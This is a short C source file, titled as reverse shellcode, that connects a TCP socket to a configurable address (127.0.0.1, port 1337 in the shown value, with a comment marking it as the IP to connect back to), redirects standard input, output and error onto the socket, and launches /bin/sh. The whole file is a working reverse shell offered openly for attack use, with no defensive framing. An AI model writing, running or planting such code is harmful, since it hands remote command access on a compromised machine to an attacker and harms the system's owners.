// Simple C reverse shellcode


#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
 
int main(void)
{
 int sockfd; 
 socklen_t socklen; 
 
 struct sockaddr_in addr; 
 
 addr.sin_family = AF_INET; 
 addr.sin_port = htons( 1337 ); // Port make sure its available
 addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // IP to connect back to.
 
 
 sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
 
 
 connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
 
 dup2(sockfd, 0);
 dup2(sockfd, 1);
 dup2(sockfd, 2);
 
 // Unleash the Kracken
 execve( "/bin/sh", NULL, NULL );
}